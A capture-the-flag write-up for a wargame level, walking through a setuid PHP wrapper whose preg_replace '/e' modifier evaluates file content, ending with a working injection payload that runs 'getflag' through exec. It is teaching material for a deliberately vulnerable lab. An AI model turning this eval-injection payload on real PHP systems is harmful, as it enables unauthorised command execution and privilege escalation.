# Level06

## Exploring the computer

```bash 
$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

We have an executable and a .php file.

## Inspecting the files

Since we can execute the level06 let's try it.

```bash 
$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

We see that he expects an argument. Let's try :

```bash 
$ ./level06 coucou
PHP Warning:  file_get_contents(coucou): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

Okay so it waits for a file.
Let's look at the .php file itself.

```bash 
$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

This script reads a file, processes its content through string manipulations, and outputs the modified result.

The  '/e' option in the preg_replace function, allows content to be evalauted as code, allowing us to execute comnmands.

Same as the previous exercice we are going to inject 'getflag' in script. Only the syntax will change but the principle stays the same.

## Getting the flag

```bash 
$ echo '[x {${exec(getflag)}}]' > /tmp/coucou 
$ ./level06 /tmp/coucou

PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : ********** in /home/user/level06/level06.php(4) : regexp code on line 1
````


